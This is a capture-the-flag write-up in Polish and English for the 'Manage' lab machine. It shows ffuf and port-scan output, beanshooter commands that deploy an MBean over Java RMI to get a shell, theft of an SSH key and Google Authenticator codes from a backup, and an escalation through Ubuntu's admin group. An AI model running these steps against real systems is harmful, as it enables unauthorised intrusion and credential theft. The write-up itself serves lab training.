# Manage
Linux, Easy, vreated by **fume & xct**

![manage_slide](https://github.com/user-attachments/assets/9aaaf3e7-585b-4d15-8682-bd80627f52b8)


```
ffuf -w ~/raft.txt -u http://10.10.120.243:8080/FUZZ -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -mc all -fs 763 -fw 68,66
```
```
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
2222/tcp open  java-rmi Java RMI
8080/tcp open  http     Apache Tomcat 10.1.19
```

```
RELEASE-NOTES.txt       [Status: 200, Size: 6776, Words: 839, Lines: 174, Duration: 60ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 95ms]
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 63ms]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 50ms]
index.jsp               [Status: 200, Size: 11219, Words: 4198, Lines: 199, Duration: 69ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 58ms]

```

I have exploited java-rmi many times as a pentester, but:
- only on windows
- ports were usually 1098-1100

Na linuxa to wydaje się być najlepsze `https://github.com/qtc-de/beanshooter.git`

![{E3613E74-6628-41B1-AC7B-B1A09D9549D0}](https://github.com/user-attachments/assets/4d0a8811-4c2a-4927-9451-69026eb8e4ae)

no i mamy dwóch userów.
Lecz jak odpalam helpa to widzę kilka ciekawych komend i postanowiłem się nimi pobawić 

![{BBF3BE07-431C-4D28-9413-F6F84219095B}](https://github.com/user-attachments/assets/277ee805-b314-4fb8-9dfb-4ab667e2afab)

```
java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.120.243 2222 tonka
java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.120.243 2222
```

po tym mamy shella od razu :D

![{D7FA9412-D626-4EF8-9C40-C9E4FADD3981}](https://github.com/user-attachments/assets/af12f638-61f6-49d7-a8fd-1dd85c56e0b1)

After short enumeration we are able to find some backup file

![{E3A9F456-4647-4DEB-916C-00E0A42215AA}](https://github.com/user-attachments/assets/d793fde7-b572-4c42-96af-21d000e39a1c)

![{AA2D445B-FBC2-43F7-9E85-71D0BA4B5BB8}](https://github.com/user-attachments/assets/54b7d600-2656-43aa-b6ac-6e735e98ed3b)

w `.ssh/id_ed25519` mamy kluczprywatny

![{87C6DEA5-C5D9-471E-A51E-3AFBE8340862}](https://github.com/user-attachments/assets/6ec101a1-39f2-45dc-858f-779eea4af200)

mmamy kody w `.google_authenticator`

![{6727B1FD-DC9A-4EB0-8249-6621E4330798}](https://github.com/user-attachments/assets/075b7f2a-4243-4c8f-b336-182282c5acc2)

z tego co widzimy to po 3 nieudanych próbach mamy blocka na 30 minutek

![{980DBBCC-6DCF-400A-A3E9-DA63F151763F}](https://github.com/user-attachments/assets/f4fd55a0-e7ec-49fc-8b0b-580e4014e40e)

but I got it in first try!

![{059162A1-E9FA-494E-9C10-082289E6B0C0}](https://github.com/user-attachments/assets/d48d776e-6098-4da0-ba54-6e61747146ae)

eskalacja jakaś trudna się nie wydaje.

![{75CF8F79-13DE-4145-B004-5BEC3B82845D}](https://github.com/user-attachments/assets/20c55361-6656-402d-9e8a-92027f755477)

myślę, że ten switch może być pomocny

![{C942A817-7AB7-44C3-9ABD-600254FF3216}](https://github.com/user-attachments/assets/2d20ebd8-0df8-47ad-8217-5ebaa89d63ee)

przy okazji hasło do admina jest takie samo jak hasło do admin z tomcata.

Problem jaki tutaj się pojawia jest taki, że w sumie regex mocno nas ogranicza i wydaje się, że nic nie zrobimy złosliwego. Jednakże tutaj chodzi o minimalną wiedzę z linuxa, a nie jakieś sztuczki. Na systemach bazwujących na ubuntu nie tylko grupa `root` jest uprzywilejowana, ale także `admin`. Więc jeżeli dodamy użytkownika o uid `admin` automatycznie zostanie on przypisany do guid `admin` (zakładając, że nie nie ma takiego usera utworzonego wcześniej).

![{51EC5220-8A60-4EEF-9A9E-35553B7DAF76}](https://github.com/user-attachments/assets/66ac1a23-26d6-41c9-9b27-f2e64ffccf7a)

i.. tyle ;)

